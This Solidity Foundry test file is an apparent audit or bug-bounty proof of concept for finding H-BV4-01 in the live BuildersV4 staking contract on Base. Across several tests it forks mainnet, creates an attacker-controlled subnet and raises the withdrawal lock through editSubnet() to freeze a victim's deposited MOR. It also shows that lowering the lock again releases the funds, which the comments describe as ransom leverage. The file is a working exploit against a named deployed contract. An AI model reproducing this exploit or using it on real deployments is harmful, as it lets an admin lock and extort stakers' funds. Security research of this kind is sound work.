// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// Minimal ABI for BuildersV4 (Base proxy 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9),
// derived from the deployed source (recon/morpheus/triage/BuildersV4-deployed.sol).
struct SubnetArg {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadataArg {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4Minimal {
    function createSubnet(SubnetArg calldata subnet_, SubnetMetadataArg calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, SubnetArg calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
    function usersData(address user_, bytes32 subnetId_)
        external
        view
        returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint128 unused2);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

/// H-BV4-01 (RONDE DELTA, hacker side): a subnet admin can freeze every
/// staker's MOR withdrawals at any time by raising
/// `withdrawLockPeriodAfterDeposit` via `editSubnet()`.
///
/// V3 guard removed: BuildersV3.editBuilderPool() required
/// `block.timestamp + editPoolDeadline < poolStart` (edits frozen once the
/// pool started) and deposit() required `now >= poolStart`. V4's editSubnet()
/// has no time restriction and _validateSubnet() only checks the lock is
/// >= minimalWithdrawLockPeriod (7d live). withdraw() reads the lock LIVE
/// from storage, so a post-deposit raise applies retroactively to existing
/// deposits. No emergency-withdraw exists; V4 also removed the pause.
///
/// Attacker cost: subnet creation is FREE live (subnetCreationFeeAmount == 0)
/// + gas. Attacker profit: 0 directly (funds are locked, not taken) — the
/// impact is on the victim (loss of access; ransom leverage for the admin).
/// Victim path: deposits into the attacker's subnet (permissionless subnet
/// creation; the victim chooses the subnet).
contract HBV401Test is Test {
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address internal constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;

    address internal attacker = address(0xA774C4E12);
    address internal victim = address(0xB1C71A);

    bytes32 internal subnetId;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), 59534749);
        // Victim holds 1,000 MOR on the fork.
        deal(MOR, victim, 1_000 ether);
        // Attacker creates a subnet (permissionless, free).
        vm.prank(attacker);
        IBuildersV4Minimal(BUILDERS_V4).createSubnet(
            SubnetArg({
                name: "h-bv4-01-delta-subnet",
                admin: attacker,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: 604800, // 7d, the live minimum
                unused2: 0,
                minimalDeposit: 100 ether,
                claimAdmin: attacker
            }),
            SubnetMetadataArg({slug: "", description: "", website: "", image: ""})
        );
        subnetId = IBuildersV4Minimal(BUILDERS_V4).getSubnetId("h-bv4-01-delta-subnet");
    }

    function _victimDeposit(uint256 amount) internal {
        vm.prank(victim);
        IERC20Minimal(MOR).approve(BUILDERS_V4, amount);
        vm.prank(victim);
        IBuildersV4Minimal(BUILDERS_V4).deposit(subnetId, amount);
    }

    function _raiseLock(uint128 newLock) internal {
        vm.prank(attacker);
        IBuildersV4Minimal(BUILDERS_V4).editSubnet(
            subnetId,
            SubnetArg({
                name: "h-bv4-01-delta-subnet",
                admin: attacker,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: newLock,
                unused2: 0,
                minimalDeposit: 100 ether,
                claimAdmin: attacker
            })
        );
    }

    function test_adminRaiseLocksVictimFunds() public {
        _victimDeposit(1_000 ether);

        // 8 days pass: under the ORIGINAL 7d lock the victim may withdraw.
        vm.warp(block.timestamp + 8 days);
        vm.prank(victim);
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 50 ether);
        assertEq(IERC20Minimal(MOR).balanceOf(victim), 50 ether, "control withdraw failed");
        console.log("control: withdraw 50 MOR ok before edit");

        // Attacker raises the lock to 1e30 seconds (~3e22 years).
        _raiseLock(1e30);
        (,,, uint128 liveLock,,,) = IBuildersV4Minimal(BUILDERS_V4).subnets(subnetId);
        assertEq(uint256(liveLock), 1e30, "lock not raised");
        console.log("admin raised withdrawLockPeriodAfterDeposit to 1e30");

        // Victim can no longer withdraw anything, now or in a year.
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 50 ether);

        vm.warp(block.timestamp + 365 days);
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 950 ether);

        // Funds are still in the contract, owned by the victim on paper.
        (, , uint256 deposited, ) = IBuildersV4Minimal(BUILDERS_V4).usersData(victim, subnetId);
        assertEq(deposited, 950 ether, "victim deposit record changed");
        assertEq(IERC20Minimal(MOR).balanceOf(BUILDERS_V4) >= 950 ether, true);
        assertEq(IERC20Minimal(MOR).balanceOf(victim), 50 ether, "victim balance changed");
        console.log("victim frozen: 950 MOR stuck in BuildersV4");

        // The attacker cannot take the victim's deposit via withdraw()
        // (withdraw is msg.sender-bound and the attacker deposited nothing).
        vm.prank(attacker);
        vm.expectRevert(bytes("BU: nothing to withdraw"));
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 1 ether);
    }

    function test_maxLockPanicsButStillFreezes() public {
        _victimDeposit(1_000 ether);
        vm.warp(block.timestamp + 8 days);
        _raiseLock(type(uint128).max);
        // lastDeposit (uint128) + lock (uint128) overflows -> panic 0x11.
        // Either way the victim cannot withdraw.
        vm.prank(victim);
        vm.expectRevert();
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 1 ether);
        console.log("lock == uint128.max -> withdraw reverts (overflow panic), still frozen");
    }

    function test_adminCanReleaseSoItIsRansomLeverage() public {
        _victimDeposit(1_000 ether);
        vm.warp(block.timestamp + 8 days);
        _raiseLock(1e30);
        vm.prank(victim);
        vm.expectRevert(bytes("BU: user withdraw is locked"));
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 100 ether);
        // Admin lowers the lock again -> victim can withdraw. The freeze is
        // entirely at the admin's discretion (ransom leverage, not a bug
        // that self-heals).
        _raiseLock(604800);
        vm.prank(victim);
        IBuildersV4Minimal(BUILDERS_V4).withdraw(subnetId, 100 ether);
        assertEq(IERC20Minimal(MOR).balanceOf(victim), 100 ether, "withdraw after release failed");
        console.log("after admin lowers lock, withdraw works again");
    }

    function test_onlyAdminCanEdit() public {
        vm.prank(victim);
        vm.expectRevert(bytes("BU: not the Subnet owner"));
        IBuildersV4Minimal(BUILDERS_V4).editSubnet(
            subnetId,
            SubnetArg({
                name: "h-bv4-01-delta-subnet",
                admin: victim,
                unused1: 0,
                withdrawLockPeriodAfterDeposit: 604800,
                unused2: 0,
                minimalDeposit: 100 ether,
                claimAdmin: victim
            })
        );
    }

    function test_liveConfig() public view {
        assertEq(IBuildersV4Minimal(BUILDERS_V4).minimalWithdrawLockPeriod(), 604800);
        console.log("minimalWithdrawLockPeriod live: 604800 (7d)");
    }
}
